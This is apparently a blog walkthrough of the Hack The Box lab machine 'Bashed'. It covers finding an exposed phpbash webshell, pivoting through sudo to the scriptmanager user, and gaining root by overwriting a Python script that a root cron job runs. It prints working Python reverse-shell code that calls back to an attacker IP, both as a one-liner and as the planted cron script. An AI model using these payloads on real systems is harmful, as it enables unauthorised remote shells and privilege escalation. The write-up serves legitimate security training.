---
title: HTB - Bashed
date: 2020-08-04 00:00
categories: [Writeups, hackthebox]
tags: [htb, linux, machines, bashed, apache, ubuntu, nmap, webshell, http, php, dirbuster, sudo, python, cron]
---

Bashed is a Linux machine running just a Web Server. However, this server is also used by for development by the Administrator. As we enumerate the service, we can see that the HTTP service account is given sudo privileges and Apache Web Seerver is also running on default config. The cron job running as root user execute scripts without any sanity check. 

## Information Gathering

### NMAP
Run a quick scan on all ports and then run default scripts and OS/Version detection on open ports only.
```terminal
$ sudo nmap -sV -sC -O -p80 -oA nmap/full-tcp 10.10.10.68
```
![nmap_scan](/assets/img/sample/htb-bashed-nmap-scan.png)

Only one port[HTTP:80] is open and its an **Apache httpd 2.4.18** running on **Ubuntu** server.

### HTTP [p.80]

Opening the website in browser loads "**Arrexel's Development Site**". 

![http_home](/assets/img/sample/htb-bashed-http-home.png)

There is only one post linked to home-page and it takes us to /single.html`. It's a blog-post that describes some **phpbash** webshell. The developer explains that this webshell was developed on this server.

![http_single](/assets/img/sample/htb-bashed-http-single.png)

Also if we inspect source-code of homepage, we can see a [GitHub Link to 'phpbash' source](https://github.com/Arrexel/phpbash)

![http_github](/assets/img/sample/htb-bashed-http-github.png)

Screenshots given by dev on github page and blog page shows a link to "*../uploads/phpbash.php*". However, the link gives us Error 404. The **uploads** directory exists and it redirects to "*../uploads/index.html*" but the **phpbash.php** webshell is not here :(

To enumerate the box further, we need to move on to *Directory Traversal Attacks* like bruteforce and Fuzz the hidden directories on server. `dirbuster` will do the job nicely here. Since `phpbash.php` is not in **uploads** and also not int web-root directory. So, the first step will be to figure out if there are any other directories (*like /uploads*) that are still hidden from us.

![http_dirbuster](/assets/img/sample/htb-bashed-http-dirbuster.png)

We can see that in addition to `/uploads/` directory, there are other directories including `/dev/` folder.

## User Shell

### Webshell [phpbash]

If we browse to any directory (like eg. /images), we can see full listing of its contents. So that makes it easier to go through their contents without guessing filenames. The dev has kept Apache's *Indexes Options* enabled globally and it helps our cause. The webshell can be found in `/dev/` directory.

![www_dev](/assets/img/sample/htb-bashed-www-dev.png)

Click on any of the two scripts and we get access to phpbash webshell as `www-data`

![www_shell](/assets/img/sample/htb-bashed-www-shell.png)

At this point, we should be able to grab the **user** flag from `/home/arrexel/user.txt`

### User [scriptmanager]

To get a interactive bash shell, we can send a **Reverse Shell** back to our machine. We can check from webshell that *Python* is available on the target box. Listen on Port `2222` with netcat and execute the following Python code.

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.12",2222));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
![reverse_shell](/assets/img/sample/htb-bashed-reverse-shell.png)

From `/etc/passwd` file, we can see that there 3 user accounts on this server.
```
root:x:0:0:root:/root:/bin/bash
arrexel:x:1000:1000:arrexel,,,:/home/arrexel:/bin/bash
scriptmanager:x:1001:1001:,,,:/home/scriptmanager:/bin/bash
```
And, most interestingly, **www-data** service account has `sudo` privliges to run commands as user **scriptmanager**.

```terminal
$ sudo -l
```
![www_sudo](/assets/img/sample/htb-bashed-www-sudol.png)

Get the shell as user **scriptmanager** simply by running `bash` with `sudo`

```terminal
$ sudo -u scriptmanager bash -i
```

### Root
User account **scriptmanager** does not have sudo privliges. We can run enumeration scripts to look for weeknesses but navigating through the filesystem, this conspicuous `/scripts` folder stand out too much.

![scripts_folder](/assets/img/sample/htb-bashed-scripts-folder.png)

There is a very simple Python script **test.py** and a text file **test.txt** in `/scripts/` folder. Here's the source code with explanation added in comments:

```python
f = open("test.txt", "w")	# Open's the file "test.txt" in "write-only" mode
f.write("testing 123!")		# write a string "testing 123!" in opened file
f.close						# Close the file
```
Let's look at properties of these files:
```
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jul 31 13:25 test.txt
```
We can see that:
1. User `scriptmanager` is the owner of Python script **test.py**
2. The file **text.txt**, created as a result of running the script, has `root` as owner. This means that whichever process executed the **test.py** script is being run by the ownership of `root`
3. The timestamp associated with **test.txt** is the current time more or less. With a bit of observation, we can find that the timestamp is being updated every 1 minute. So, this can be most probably a **cron** job.

To get **root** privliges, we can simply edit the Python script **test.py** and make the cron job send us root shell on our machine. Let's modify the same python reverse-shell script we used earlier and also change port to an unused one, lets say `2223`
```python
#!/usr/bin/env python3
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.12",2223))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])
```
And that should be it!! Liten on `2223` port on our machine with `netcat` and upload the script to **/scripts/test.py**. As soon as the cron job kicks in, we get the reverse shell on our machine as **root**

![root_shell](/assets/img/sample/htb-bashed-root-shell.png)